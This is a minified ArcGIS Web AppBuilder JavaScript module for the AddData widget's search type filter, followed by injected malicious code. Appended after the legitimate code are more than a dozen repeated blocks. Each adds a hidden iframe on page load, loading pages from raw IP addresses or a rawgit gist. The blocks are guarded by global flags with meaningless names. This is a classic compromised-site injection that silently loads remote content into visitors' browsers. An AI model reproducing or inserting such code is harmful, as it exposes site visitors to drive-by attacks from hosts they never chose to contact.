// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/AddData/search/templates/TypeOptions.html":'\x3cdiv class\x3d"search-data-type-options"\x3e\r\n  \x3cdiv data-dojo-type\x3d"dijit/form/DropDownButton"\x3e\r\n    \x3cspan\x3e${i18n.search.typeOptions.prompt}\x3c/span\x3e\r\n    \x3cdiv data-dojo-type\x3d"dijit/TooltipDialog"\r\n         data-dojo-attach-point\x3d"tooltipDialog"\r\n         data-dojo-props\x3d"\'class\':\'add-data-widget-popup\'"\x3e\r\n      \x3clabel for\x3d"${id}_mapServiceId" class\x3d"search-type-option"\x3e\r\n        \x3cinput id\x3d"${id}_mapServiceId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"mapServiceToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;Map Service\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.mapService}\r\n      \x3c/label\x3e\r\n      \x3clabel for\x3d"${id}_featureServiceId" class\x3d"search-type-option"\x3e\r\n        \x3cinput id\x3d"${id}_featureServiceId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"featureServiceToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;Feature Service\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.featureService}\r\n      \x3c/label\x3e\r\n      \x3clabel for\x3d"${id}_imageServiceId" class\x3d"search-type-option"\x3e\r\n        \x3cinput id\x3d"${id}_imageServiceId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"imageServiceToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;Image Service\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.imageService}\r\n      \x3c/label\x3e\r\n      \x3clabel for\x3d"${id}_vectorTileServiceId" class\x3d"search-type-option"\r\n        data-dojo-attach-point\x3d"vectorTileNode"\x3e\r\n        \x3cinput id\x3d"${id}_vectorTileServiceId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"vectorTileServiceToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;Vector Tile Service\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.vectorTileService}\r\n      \x3c/label\x3e\r\n      \x3clabel for\x3d"${id}_kmlId" class\x3d"search-type-option"\x3e\r\n        \x3cinput id\x3d"${id}_kmlId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"kmlToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;KML\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.kml}\r\n      \x3c/label\x3e\r\n       \x3clabel for\x3d"${id}_wmsId" class\x3d"search-type-option"\x3e\r\n        \x3cinput id\x3d"${id}_wmsId"\r\n          data-dojo-type\x3d"dijit/form/CheckBox"\r\n          data-dojo-attach-point\x3d"wmsToggle"\r\n          data-dojo-attach-event\x3d"onClick: optionClicked"\r\n          data-option-q\x3d\'type:\x26quot;WMS\x26quot;\'/\x3e\r\n        ${i18n.search.typeOptions.wms}\r\n      \x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/on ./SearchComponent dojo/text!./templates/TypeOptions.html dojo/i18n!../nls/strings esri/layers/VectorTileLayer dijit/TooltipDialog dijit/form/DropDownButton dijit/form/CheckBox".split(" "),function(g,h,k,l,m,n,p,b){return g([m],{i18n:p,templateString:n,postCreate:function(){this.inherited(arguments);b&&b.supported()||(console.warn("AddData: Vector Tile is not supported."),this.vectorTileNode.style.display="none");this.own(l(this.tooltipDialog,
"open",k.hitch(this,function(){this.tooltipDialog.domNode.className+=" "+this.searchPane.wabWidget.appConfig.theme.name})))},getOptionWidgets:function(){return[this.mapServiceToggle,this.featureServiceToggle,this.imageServiceToggle,this.vectorTileServiceToggle,this.kmlToggle,this.wmsToggle]},optionClicked:function(){this.search()},appendQueryParams:function(c){var b=function(a,b){0<a.length&&(a+=" OR ");return a+b},a="",d="",f=!1;h.forEach(this.getOptionWidgets(),function(c){var e=c.focusNode.getAttribute("data-option-q");
d=b(d,e);c.get("checked")&&(a=b(a,e),f=!0)});f||(a=d);null!==a&&0<a.length&&(a="("+a+")",c.q=null!==c.q&&0<c.q.length?c.q+(" AND "+a):a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});